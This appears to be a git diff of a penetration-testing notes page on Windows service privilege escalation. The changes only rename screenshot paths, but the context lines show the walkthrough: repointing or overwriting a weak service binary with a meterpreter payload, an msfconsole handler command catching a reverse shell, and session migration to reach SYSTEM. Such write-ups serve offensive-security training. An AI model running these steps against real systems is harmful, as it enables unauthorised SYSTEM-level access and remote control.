@@ -19,7 +19,7 @@ or
 
 Below indicates that the user `mantvydas` has full access to the service:
 
-![](<../../.gitbook/assets/Annotation 2019-05-21 205403.png>)
+![](../../.gitbook/assets/annotation-2019-05-21-205403.png)
 
 Let's modify the service and point its binary to our malicious binary that will get us a meterpreter shell when the service is launched:
 
@@ -29,7 +29,7 @@ Let's modify the service and point its binary to our malicious binary that will 
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Annotation 2019-05-21 205633.png>)
+![](../../.gitbook/assets/annotation-2019-05-21-205633.png)
 
 Let's fire up a multihandler in mfsconsole:
 
@@ -49,7 +49,7 @@ msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; se
 
 ..and enjoy the meterpreter session:
 
-![](<../../.gitbook/assets/Annotation 2019-05-21 210027.png>)
+![](../../.gitbook/assets/annotation-2019-05-21-210027.png)
 
 Note that the meterpreter session will die soon since the meterpreter binary `program.exe` that the vulnerable service `VulnSvc` kicked off, is not a compatible service binary. To save the session, migrate it to another sprocess:
 
@@ -61,7 +61,7 @@ run post/windows/manage/migrate
 
 Even though the service failed, the session was migrated and saved:
 
-![](<../../.gitbook/assets/Annotation 2019-05-21 210541.png>)
+![](<../../.gitbook/assets/Annotation 2019-05-21 210541 (1).png>)
 
 ## 2. Overwriting Service Binary
 
@@ -73,7 +73,7 @@ sc.exe qc evilsvc
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Annotation 2019-05-21 210916.png>)
+![](../../.gitbook/assets/annotation-2019-05-21-210916.png)
 
 Let's check file permissions of the binary c:\service.exe using a native windows tool `icals` and look for (M)odify or (F)ull permissions for `Authenticated Users` or the user you currently have a shell with:
 
@@ -83,7 +83,7 @@ icacls C:\service.exe
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Annotation 2019-05-21 211128.png>)
+![](../../.gitbook/assets/annotation-2019-05-21-211128.png)
 
 Since c:\service.exe is (M)odifiable by any authenticated user, we can move our malicious binary c:\program.exe to c:\service.exe:
 
@@ -94,12 +94,12 @@ ls c:\
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Annotation 2019-05-21 211232.png>)
+![](../../.gitbook/assets/annotation-2019-05-21-211232.png)
 
 ...and get the meterpreter shell once `sc start evilsvc` is executed. Note that the shell will die if we do not migrate the process same way as mentioned earlier:
 
-![](<../../.gitbook/assets/Annotation 2019-05-21 211349.png>)
+![](../../.gitbook/assets/annotation-2019-05-21-211349.png)
 
 Since services usually run under `NT AUTHORITY\SYSTEM`, our malicious binary gets executed with `SYSTEM` privileges:
 
-![](<../../.gitbook/assets/Annotation 2019-05-21 212438.png>)
+![](../../.gitbook/assets/annotation-2019-05-21-212438.png)
